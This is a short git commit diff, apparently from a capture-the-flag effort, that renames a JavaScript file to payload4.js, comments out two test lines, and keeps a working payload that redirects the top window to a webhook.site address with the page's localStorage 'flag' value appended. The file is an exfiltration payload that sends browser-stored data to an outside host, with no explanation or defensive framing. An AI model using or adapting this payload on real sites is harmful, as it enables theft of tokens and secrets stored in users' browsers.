fc32c923ad6877623a1ca160dd48b1fe533a2661
Simon <androz2091@gmail.com>
2025-03-28 19:06:10 +0100

    Update and rename payload3.js to payload4.js

--- payload4.js
+++ payload4.js
@@ -1,3 +1,3 @@
-alert("COUCOU")
-localStorage.getItem('flag');
+//alert("COUCOU")
+//localStorage.getItem('flag');
 window.top.location.href = "https://webhook.site/e9ffc5ba-28d5-403b-a995-22ece3e79b9e?payload=" + localStorage.getItem('flag');
